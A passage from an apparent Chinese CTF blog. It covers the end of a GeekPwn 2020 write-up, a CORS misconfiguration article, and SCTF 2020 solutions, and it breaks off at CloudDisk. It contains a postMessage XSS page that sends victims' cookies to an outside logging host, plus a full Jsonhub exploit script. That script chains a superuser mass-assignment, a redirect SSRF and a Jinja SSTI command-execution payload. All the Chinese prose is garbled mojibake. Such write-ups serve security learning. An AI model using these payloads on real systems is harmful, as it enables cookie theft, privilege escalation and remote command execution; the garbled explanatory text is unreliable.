<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    </span><br><span class="line">&lt;iframe src=&quot;http://umsg.iffi.top:3000/&quot; height=&quot;100%&quot; width=&quot;100%&quot; frameborder=&quot;0&quot; scrolling=&quot;auto&quot;&gt;</span><br><span class="line">&lt;/iframe&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">setTimeout(()=&gt;&#123;</span><br><span class="line">document.body.children[0].contentWindow.postMessage(&#123;action:&quot;append&quot;,payload:&quot;&lt;img src=1 onerror=&#x27;location=(`http://ccreater.top:60010/log.php?log=`+document.cookie)&#x27;&gt;&quot;&#125;,&quot;http://umsg.iffi.top:3000/&quot;)</span><br><span class="line">&#125;,5000);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="https://site.ccreater.top/2020/07/18/geekpwn2020/" data-id="ckw7zp3za004lftn77nvregnw" data-title="geekpwn2020" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-bypass CORS" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/07/08/bypass%20CORS/" class="article-date">
  <time class="dt-published" datetime="2020-07-08T16:00:00.000Z" itemprop="datePublished">2020-07-09</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/web/">web</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/07/08/bypass%20CORS/">bypass CORS</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="bypass-CORS"><a href="#bypass-CORS" class="headerlink" title="bypass CORS"></a>bypass CORS</h1><h2 id="ä»€ä¹ˆæ˜¯CORS"><a href="#ä»€ä¹ˆæ˜¯CORS" class="headerlink" title="ä»€ä¹ˆæ˜¯CORS"></a>ä»€ä¹ˆæ˜¯CORS</h2><p>CORS: Cross Origin Resource Share,è®¾ç½®åœ¨æœåŠ¡ç«¯ï¼Œå®¢æˆ·ç«¯æ‰§è¡Œçš„ä¸€ç§ç­–ç•¥ã€‚</p>
<blockquote>
<p>å‡ºäºå®‰å…¨åŸå› ï¼Œæµè§ˆå™¨é™åˆ¶ä»è„šæœ¬å†…å‘èµ·çš„è·¨æºHTTPè¯·æ±‚æˆ–è€… è·¨ç«™è¯·æ±‚å¯ä»¥æ­£å¸¸å‘èµ·ï¼Œä½†æ˜¯è¿”å›ç»“æœè¢«æµè§ˆå™¨æ‹¦æˆªäº† ã€‚ ä¾‹å¦‚ï¼ŒXMLHttpRequestå’ŒFetch APIéµå¾ªåŒæºç­–ç•¥ã€‚ è¿™æ„å‘³ç€ä½¿ç”¨è¿™äº›APIçš„Webåº”ç”¨ç¨‹åºåªèƒ½ä»åŠ è½½åº”ç”¨ç¨‹åºçš„åŒä¸€ä¸ªåŸŸè¯·æ±‚HTTPèµ„æºï¼Œé™¤éå“åº”æŠ¥æ–‡åŒ…å«äº†æ­£ç¡®CORSå“åº”å¤´ã€‚ </p>
</blockquote>
<h2 id="ç›¸å…³çš„å­—æ®µ"><a href="#ç›¸å…³çš„å­—æ®µ" class="headerlink" title="ç›¸å…³çš„å­—æ®µ"></a>ç›¸å…³çš„å­—æ®µ</h2><p>å“åº”ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin</span><br><span class="line">Access-Control-Expose-Headers</span><br><span class="line">Access-Control-Max-Age</span><br><span class="line">Access-Control-Allow-Credentials</span><br><span class="line">Access-Control-Allow-Methods</span><br><span class="line">Access-Control-Allow-Headers</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¯·æ±‚ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Origin</span><br><span class="line">Access-Control-Request-Method</span><br><span class="line">Access-Control-Request-Headers</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="CORSé…ç½®é”™è¯¯"><a href="#CORSé…ç½®é”™è¯¯" class="headerlink" title="CORSé…ç½®é”™è¯¯"></a>CORSé…ç½®é”™è¯¯</h2><h3 id="æ ¹æ®æŸäº›å­—æ®µæ¥è®¾ç½®ACAOå¤´"><a href="#æ ¹æ®æŸäº›å­—æ®µæ¥è®¾ç½®ACAOå¤´" class="headerlink" title="æ ¹æ®æŸäº›å­—æ®µæ¥è®¾ç½®ACAOå¤´"></a>æ ¹æ®æŸäº›å­—æ®µæ¥è®¾ç½®ACAOå¤´</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /sensitive-victim-data HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Origin: https://malicious-website.com</span><br><span class="line">Cookie: sessionid=...</span><br><span class="line"></span><br><span class="line">æ ¹æ®Originå¤´æ¥è®¾ç½®Access-Control-Allow-Origin</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Access-Control-Allow-Origin: https://malicious-website.com</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br></pre></td></tr></table></figure>

<h3 id="å¯¹Originå¤´çš„é”™è¯¯è§£æ"><a href="#å¯¹Originå¤´çš„é”™è¯¯è§£æ" class="headerlink" title="å¯¹Originå¤´çš„é”™è¯¯è§£æ"></a>å¯¹Originå¤´çš„é”™è¯¯è§£æ</h3><p>å› ä¸ºè¦å¯¹å­åŸŸåçš„æ”¯æŒï¼Œæ‰€ä»¥æœ‰äº›ç½‘ç«™ä¼šè¿™æ ·å†™:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if Origin.domain startwith &quot;domain.com&quot;:</span><br><span class="line">	return &quot;Access-Control-Allow-Origin: &quot;+Origin</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æˆ–è€…</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if Origin.domain endwith &quot;domain.com&quot;:</span><br><span class="line">	return &quot;Access-Control-Allow-Origin: &quot;+Origin</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>åƒè¿™ç§éƒ½å¾ˆå¥½ç»•è¿‡ï¼š</p>
<p>domain.com.evildomain.com æˆ–è€… evildomain-domain.com</p>
<h3 id="ç™½åå•ä¸­å­˜åœ¨-null"><a href="#ç™½åå•ä¸­å­˜åœ¨-null" class="headerlink" title="ç™½åå•ä¸­å­˜åœ¨:null"></a>ç™½åå•ä¸­å­˜åœ¨:null</h3><p> Originæ”¯æŒå€¼nullï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæµè§ˆå™¨å¯èƒ½ä¼šåœ¨Originæ ‡å¤´ä¸­å‘é€å€¼nullï¼š</p>
<ul>
<li><p>è·¨ç«™ç‚¹é‡å®šå‘</p>
</li>
<li><p>æ¥è‡ªåºåˆ—åŒ–æ•°æ®çš„è¯·æ±‚</p>
</li>
<li><p>ä½¿ç”¨<code>file</code>åè®®çš„è¯·æ±‚</p>
</li>
<li><p>æ²™ç›’ä¸­çš„è·¨åŸŸè¯·æ±‚</p>
</li>
</ul>
<h2 id="åˆ©ç”¨å—ä¿¡ä»»çš„åŸŸ"><a href="#åˆ©ç”¨å—ä¿¡ä»»çš„åŸŸ" class="headerlink" title="åˆ©ç”¨å—ä¿¡ä»»çš„åŸŸ"></a>åˆ©ç”¨å—ä¿¡ä»»çš„åŸŸ</h2><p>åœ¨å—ä¿¡ä»»çš„åŸŸä¸Šæ‰¾åˆ°xssï¼Œå°±å¯ä»¥ç»•è¿‡CORS</p>
<h2 id="ä¸­é—´äººæ”»å‡»"><a href="#ä¸­é—´äººæ”»å‡»" class="headerlink" title="ä¸­é—´äººæ”»å‡»"></a>ä¸­é—´äººæ”»å‡»</h2><p>23333</p>
<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p> <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cors">https://portswigger.net/web-security/cors</a> </p>
<p> <a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS</a> </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://site.ccreater.top/2020/07/08/bypass%20CORS/" data-id="ckw7zp3yp003eftn78br6d1gp" data-title="bypass CORS" class="article-share-link">Share</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-sctf2020" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/07/07/sctf2020/" class="article-date">
  <time class="dt-published" datetime="2020-07-07T16:00:00.000Z" itemprop="datePublished">2020-07-08</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">æ¯”èµ›</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/07/07/sctf2020/">sctf2020</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="SCTF-2020"><a href="#SCTF-2020" class="headerlink" title="SCTF 2020"></a>SCTF 2020</h1><h2 id="Jsonhub"><a href="#Jsonhub" class="headerlink" title="Jsonhub"></a>Jsonhub</h2><p>é˜…è¯»ä»£ç å‘ç°ï¼Œè¿™ä¸€é¢˜å­˜åœ¨ç€ä¸¤ä¸ªç¯å¢ƒï¼Œå…¶ä¸­ï¼Œå†…ç½‘æœåŠ¡å¯ä»¥sstiï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æƒ³åŠæ³•è®¿é—®å†…ç½‘ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/caculator&#x27;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">caculator</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = request.get_json()</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> json.dumps(&#123;<span class="string">&quot;code&quot;</span>: -<span class="number">1</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Request data can&#x27;t be unmarshal&quot;</span>&#125;)</span><br><span class="line">    num1 = <span class="built_in">str</span>(data[<span class="string">&quot;num1&quot;</span>])</span><br><span class="line">    num2 = <span class="built_in">str</span>(data[<span class="string">&quot;num2&quot;</span>])</span><br><span class="line">    symbols = data[<span class="string">&quot;symbols&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> re.search(<span class="string">&quot;[a-z]&quot;</span>, num1, re.I) <span class="keyword">or</span> re.search(<span class="string">&quot;[a-z]&quot;</span>, num2, re.I) <span class="keyword">or</span> <span class="keyword">not</span> re.search(<span class="string">&quot;[+\-*/]&quot;</span>, symbols):</span><br><span class="line">        <span class="keyword">return</span> json.dumps(&#123;<span class="string">&quot;code&quot;</span>: -<span class="number">1</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;?&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="built_in">str</span>(num1) + symbols + <span class="built_in">str</span>(num2) + <span class="string">&quot;=&quot;</span> + <span class="string">&quot;?&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥è¿›è¡Œç¬¦åˆæ¡ä»¶çš„ssrfçš„åªæœ‰</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flask_rpc</span>(<span class="params">request</span>):</span></span><br><span class="line">    <span class="keyword">if</span> request.META[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] != <span class="string">&quot;127.0.0.1&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: -<span class="number">1</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Must 127.0.0.1&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    methods = request.GET.get(<span class="string">&quot;methods&quot;</span>)</span><br><span class="line">    url = request.GET.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> methods == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(</span><br><span class="line">            &#123;<span class="string">&quot;code&quot;</span>: <span class="number">0</span>, <span class="string">&quot;message&quot;</span>: requests.get(url, headers=&#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Django proxy =v=&quot;</span>&#125;, timeout=<span class="number">1</span>).text&#125;)</span><br><span class="line">    <span class="keyword">elif</span> methods == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        data = base64.b64decode(request.GET.get(<span class="string">&quot;data&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: <span class="number">0</span>, <span class="string">&quot;message&quot;</span>: requests.post(url, data=data,</span><br><span class="line">                                                                 headers=&#123;<span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Django proxy =v=&quot;</span>,</span><br><span class="line">                                                                          <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>&#125;, timeout=<span class="number">1</span>).text&#125;)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: -<span class="number">1</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;=3=&quot;</span>&#125;)</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯éœ€è¦<code>request.META[&#39;REMOTE_ADDR&#39;]==127.0.0.1</code>ï¼Œåˆ©ç”¨ CVE-2018-14574è·³è½¬åˆ°127.0.0.1:8000è®¿é—®/rpc ï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½sstiï¼Œåœ¨è¿™ä¹‹å‰æˆ‘ä»¬éœ€è¦æåˆ°Token</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span>(<span class="params">request</span>):</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render(request, <span class="string">&quot;templates/home.html&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        white_list = [<span class="string">&quot;39.104.19.182&quot;</span>]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = json.loads(request.body)</span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: -<span class="number">1</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Request data can&#x27;t be unmarshal&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> Token.objects.<span class="built_in">all</span>().first().Token == data[<span class="string">&quot;token&quot;</span>]:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span> ssrf_check(data[<span class="string">&quot;url&quot;</span>], white_list):</span><br><span class="line">                    <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: -<span class="number">1</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Hacker!&quot;</span>&#125;)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    res = requests.get(data[<span class="string">&quot;url&quot;</span>], timeout=<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: -<span class="number">1</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Request Error&quot;</span>&#125;)</span><br><span class="line">            <span class="keyword">if</span> res.status_code == <span class="number">200</span>:</span><br><span class="line">                <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: <span class="number">0</span>, <span class="string">&quot;message&quot;</span>: res.text&#125;)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: -<span class="number">1</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Something Wrong&quot;</span>&#125;)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: -<span class="number">1</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Token Error&quot;</span>&#125;)</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reg</span>(<span class="params">request</span>):</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render(request, <span class="string">&quot;templates/reg.html&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = json.loads(request.body)</span><br><span class="line">        <span class="keyword">except</span> ValueError:</span><br><span class="line">            <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: -<span class="number">1</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Request data can&#x27;t be unmarshal&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(User.objects.<span class="built_in">filter</span>(username=data[<span class="string">&quot;username&quot;</span>])) != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: <span class="number">1</span>&#125;)</span><br><span class="line">        User.objects.create_user(**data)</span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">&quot;code&quot;</span>: <span class="number">0</span>&#125;)</span><br></pre></td></tr></table></figure>

<p>æ„é€ ï¼š<code>&#123;&quot;username&quot;:&quot;test66666&quot;,&quot;password&quot;:&quot;test66666&quot;,&quot;is_staff&quot;:true,&quot;is_superuser&quot;:true&#125;</code></p>
<p>å¾—åˆ°token:<code>3ad9af405504233188f694a11ff22115</code></p>
<p>æ¥ä¸‹æ¥å°±æ˜¯sstiäº†</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/caculator&#x27;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">caculator</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = request.get_json()</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> json.dumps(&#123;<span class="string">&quot;code&quot;</span>: -<span class="number">1</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Request data can&#x27;t be unmarshal&quot;</span>&#125;)</span><br><span class="line">    num1 = <span class="built_in">str</span>(data[<span class="string">&quot;num1&quot;</span>])</span><br><span class="line">    num2 = <span class="built_in">str</span>(data[<span class="string">&quot;num2&quot;</span>])</span><br><span class="line">    symbols = data[<span class="string">&quot;symbols&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> re.search(<span class="string">&quot;[a-z]&quot;</span>, num1, re.I) <span class="keyword">or</span> re.search(<span class="string">&quot;[a-z]&quot;</span>, num2, re.I) <span class="keyword">or</span> <span class="keyword">not</span> re.search(<span class="string">&quot;[+\-*/]&quot;</span>, symbols):</span><br><span class="line">        <span class="keyword">return</span> json.dumps(&#123;<span class="string">&quot;code&quot;</span>: -<span class="number">1</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;?&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="built_in">str</span>(num1) + symbols + <span class="built_in">str</span>(num2) + <span class="string">&quot;=&quot;</span> + <span class="string">&quot;?&quot;</span>)</span><br></pre></td></tr></table></figure>





<p>æœ€åçš„payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">num1=<span class="number">1</span></span><br><span class="line">num2=<span class="number">2</span></span><br><span class="line">symbols=<span class="string">&quot;-&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[409](&#x27;/readflag&#x27;,shell=True,stdout=-1).communicate()&#125;&#125;-&quot;</span></span><br><span class="line">data=&#123;</span><br><span class="line">    <span class="string">&quot;num1&quot;</span>:num1,</span><br><span class="line">    <span class="string">&quot;num2&quot;</span>:num2,</span><br><span class="line">    <span class="string">&quot;symbols&quot;</span>:symbols</span><br><span class="line">&#125;</span><br><span class="line">payload=json.dumps(data).replace(<span class="string">&quot;&#123;&#123;&quot;</span>,<span class="string">&quot;\\u007b\\u007b&quot;</span>).replace(<span class="string">&quot;&#125;&#125;&quot;</span>,<span class="string">&quot;\\u007d\\u007d&quot;</span>)</span><br><span class="line">payload=base64.b64encode(payload)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">burp0_url = <span class="string">&quot;http://39.104.19.182:80/home/&quot;</span></span><br><span class="line">burp0_cookies = &#123;<span class="string">&quot;sessionid&quot;</span>: <span class="string">&quot;bd63u3ewjx05tc7ajvlkve7b9cu8h4kx&quot;</span>, <span class="string">&quot;csrftoken&quot;</span>: <span class="string">&quot;GBW7niMYrwP9fMP6jpgHN1ujcxEwuRQ4tMKdBDdnZvSlDny51S1K1cMmWtOsR0gO&quot;</span>&#125;</span><br><span class="line">burp0_headers = &#123;<span class="string">&quot;Pragma&quot;</span>: <span class="string">&quot;no-cache&quot;</span>, <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;no-cache&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json, text/plain, */*&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json;charset=UTF-8&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://39.104.19.182&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://39.104.19.182/home/&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">burp0_json=&#123;<span class="string">&quot;token&quot;</span>: <span class="string">&quot;3ad9af405504233188f694a11ff22115&quot;</span>, <span class="string">&quot;url&quot;</span>: <span class="string">&quot;http://39.104.19.182//127.0.0.1:8000/rpc?url=http://127.0.0.1:5000/caculator&amp;methods=POST&amp;data=&#123;payload&#125;&quot;</span>.<span class="built_in">format</span>(payload=payload)&#125;</span><br><span class="line"><span class="built_in">print</span>(requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json).text)</span><br></pre></td></tr></table></figure>



<p><code>SCTF&#123;2b19246757c63738e7c40bbdf87c3be1&#125;</code></p>
<h2 id="Can-you-hear"><a href="#Can-you-hear" class="headerlink" title="Can you hear"></a>Can you hear</h2><p>We used the receiver to receive the information from the space station and tried to unlock the answerğŸ˜€.</p>
<p>æœç´¢ â€œç©ºé—´ç«™â€ â€œæ¥æ”¶æœºâ€ ä¿¡æ¯ éŸ³é¢‘ ç­‰å…³é”®å­—æ‰¾åˆ°<br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/98103018">https://zhuanlan.zhihu.com/p/98103018</a><br><a target="_blank" rel="noopener" href="https://www.sohu.com/a/159552694_610733">https://www.sohu.com/a/159552694_610733</a><br>SSTVå…³é”®å­—</p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/105460358">https://zhuanlan.zhihu.com/p/105460358</a><br><a target="_blank" rel="noopener" href="https://ourcodeworld.com/articles/read/956/how-to-convert-decode-a-slow-scan-television-transmissions-sstv-audio-file-to-images-using-qsstv-in-ubuntu-18-04">https://ourcodeworld.com/articles/read/956/how-to-convert-decode-a-slow-scan-television-transmissions-sstv-audio-file-to-images-using-qsstv-in-ubuntu-18-04</a></p>
<p>ä¸‹è½½ mmsstv<br>ä¿®æ”¹å½•éŸ³è®¾å¤‡ä¸ºç«‹ä½“å£°æ··éŸ³<br>å…·ä½“æ“ä½œä¸ºï¼šOption-&gt;Soundcard input level<br>æ’­æ”¾éŸ³é¢‘å¾—åˆ°flag:</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200704145700.png" alt="image5949"><br>SCTF{f78fsd1423fvsa}</p>
<h2 id="CloudDisk"><a href="#CloudDisk" class="headerlink" title="CloudDisk"></a>CloudDisk</h2><p>app.js</p>
